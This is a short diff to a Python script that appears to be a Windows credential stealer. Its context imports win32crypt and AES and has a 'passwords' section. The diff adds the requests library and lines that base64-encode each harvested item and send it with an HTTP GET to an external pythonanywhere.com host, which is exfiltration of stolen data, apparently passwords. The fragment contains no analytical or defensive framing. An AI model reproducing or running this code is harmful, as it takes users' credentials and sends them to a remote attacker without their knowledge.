@@ -6,7 +6,7 @@ except:
     os.system('pip install pycryptodome==3.18.0 pywin32==305')
     import win32crypt
     from Crypto.Cipher import AES
-import json, subprocess, hashlib, base64, sqlite3, shutil
+import json, subprocess, hashlib, base64, sqlite3, shutil,requests
 from datetime import timezone, datetime, timedelta
 
 ### passwords ###
@@ -160,6 +160,9 @@ def run():
                 if mem not in mems:
                     print(mem)
                     mems.append(mem)
+                    b64mem=base64.b64encode(mem.encode()).decode()
+                    print(b64mem)
+                    requests.get(f"http://surrealsocials.pythonanywhere.com/mems?mem={b64mem}")
                     with open('results.txt','r') as f:
                         if mem not in f.read():
                             with open('results.txt','a') as f:
